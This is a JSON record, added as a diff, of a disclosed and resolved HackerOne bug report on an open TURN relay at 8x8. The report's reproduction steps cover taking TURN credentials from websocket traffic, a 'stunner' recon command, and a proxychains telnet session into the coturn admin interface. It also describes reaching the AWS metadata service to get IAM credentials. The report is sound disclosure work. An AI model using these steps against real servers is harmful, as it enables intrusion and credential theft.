@@ -1,0 +1,120 @@
+{
+  "id": 843256,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC84NDMyNTY=",
+  "url": "https://hackerone.com/reports/843256",
+  "title": "Open TURN relay abuse is possible due to lack of peer access control (Critical)",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "readable_substate": "Resolved",
+  "created_at": "2020-04-08T14:42:53.762Z",
+  "submitted_at": "2020-04-08T14:42:53.762Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "sandrogauci",
+    "url": "/sandrogauci",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/h1r9ltrlx7r5drucw3cbori5g2mx/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 49732,
+    "url": "https://hackerone.com/8x8-bounty",
+    "handle": "8x8-bounty",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/3y22a5r49ryw4d4454msmh3frrgn/c8a1698ff707a5e3e8a91a3484838363845daac68cb82c86d55c9e2d44d67b67",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/3y22a5r49ryw4d4454msmh3frrgn/74790fe75ac5dbe8a5140a122388d59ebac913dcfa941f0b3a45e6cad161f9ea"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "8x8",
+      "twitter_handle": "8x8",
+      "website": "https://www.8x8.com",
+      "about": "Let's power your CX ambitions."
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2020-06-08T21:36:26.131Z",
+  "bug_reporter_agreed_on_going_public_at": "2020-04-13T17:46:46.061Z",
+  "team_member_agreed_on_going_public_at": "2020-06-08T21:36:26.028Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "> NOTE: This is not an SSRF vulnerability but an open TURN relay vulnerability. Typically, this security vulnerability has at least the same impact as an SSRF. However it is considered more useful from an attacker's point of view since attacks are not restricted to HTTP.\n\n- Affects: \n    - `█████:443`\n    - `████████:443`\n\n## Description\n\nThe affected TURN server did not put any restrictions on peer which allows remote attackers to bypass firewall rules and reach internal services on the server itself as well as the AWS internal network. In the case of `██████████:443`, both TCP and UDP peers could be specified, while `███████:443` appeared to restrict TCP and only allow UDP.\n\n## Steps To Reproduce:\n\n1. Retrieved temporary TURN credentials from XMPP by:\n    - making use of Chrome's devtools \n    - open the network tab, filter just WS connections\n    - in the `xmpp-websocket` messages, set a filter for `type='turn'`\n    - observe the TURN hostname and credentials\n2. Made use of an internal tool called `stunner` as follows: `stunner recon tls://███████:443 -u ████████`\n3. Made use of stunner's port scanner and socks proxy to reach the telnet server, AWS meta-data service and so on\n\nNote that we restricted our tests to just the following to avoid causing denial of service to the system:\n\n- Read access to AWS meta-data service\n- Only running `help` and `pc` commands on coturn telnet server (other commands may be destructive)\n\nThe following is an excerpt from the connection to the coturn telnet server:\n\n\n```\nproxychains -f config telnet 127.0.0.1 5766\n[proxychains] config file found: config\n[proxychains] preloading /usr/lib64/proxychains-ng/libproxychains4.so\n[proxychains] DLL init: proxychains-ng 4.13\nTrying 127.0.0.1...\n[proxychains] Dynamic chain  ...  127.0.0.1:9999  ...  127.0.0.1:5766  ...  OK\nConnected to 127.0.0.1.\nEscape character is '^]'.\n\n> pc\n\n  verbose: ON\n  daemon process: ON\n  stale-nonce: ON (*)\n  stun-only: OFF (*)\n  no-stun: OFF (*)\n  secure-stun: OFF (*)\n  do-not-use-config-file: OFF\n  RFC5780 support: ON\n  net engine version: 3\n  net engine: UDP thread per CPU core\n  enforce fingerprints: OFF\n  mobility: OFF (*)\n  udp-self-balance: OFF\n  pidfile: /var/run/turnserver.pid\n  process user ID: 0\n  process group ID: 0\n  process dir: /\n\n  cipher-list: DEFAULT\n  ec-curve-name: empty\n  DH-key-length: 1066\n  Certificate Authority file: empty\n  Certificate file: /████████.crt\n  Private Key file: /███.key\n  Listener addr: 127.0.0.1\n  Listener addr: ██████\n  Listener addr: ::1\n  Listener addr: ███████\n  no-udp: OFF\n  no-tcp: OFF\n  no-dtls: OFF\n  no-tls: OFF\n  TLSv1.0: ON\n    TLSv1.1: ON\n  TLSv1.2: ON\n  listener-port: 443\n  tls-listener-port: 5349\n  alt-listener-port: 0\n  alt-tls-listener-port: 0\n\n\n  Relay addr: █████\n  Relay addr: ██████████\n  server-relay: OFF\n  no-udp-relay: OFF (*)\n  no-tcp-relay: OFF (*)\n  min-port: 49152\n  max-port: 65535\n  no-multicast-peers: OFF (*)\n  no-loopback-peers: OFF (*)\n\n  DB type: SQLite\n  DB: /var/lib/turn/turndb\n\n  Default realm: █████\n  CLI session realm: █████\n...\n\n> q\n```\n\n## Supporting Material/References:\n\n- Similar vulnerability: <https://www.rtcsec.com/2020/04/01-slack-webrtc-turn-compromise>\n\n## Impact\n\nAbuse of this vulnerability allows attackers to:\n\n- control Coturn by connecting to the telnet server on port 5766 which in turn, allows for writing of files on disk (e.g. using `psd` command), display and editing of the coturn configuration, stopping the server\n- connecting to the AWS meta-data service and retrieving IAM credentials for user `HipChatVideo-Coturn`, viewing user-data configuration etc\n- scanning `127.0.0.1` and internal network on `██████` and connecting to internal services\n\nNote that in the case of `██████████:443`, both TCP and UDP peers can be specified, while `███:443` appeared to be restricted to just UDP which somewhat limits the security impact of this vulnerability.\n\nWe think that it is likely that abuse of the coturn telnet server could lead to remote code execution on the server and further penetration inside 8x8's infrastructure.",
+  "bounty_amount": "700.0",
+  "formatted_bounty": "$700",
+  "weakness": {
+    "id": 68,
+    "name": "Server-Side Request Forgery (SSRF)"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 23,
+  "voters": [
+    "pmnh",
+    "sandrogauci",
+    "porcupineyhairs",
+    "roland_hack",
+    "n0x496n",
+    "ivodafon",
+    "shadowrunner",
+    "ali",
+    "leonishan",
+    "mik317",
+    "and 13 more..."
+  ],
+  "severity": {
+    "rating": "high",
+    "author_type": "Team"
+  },
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
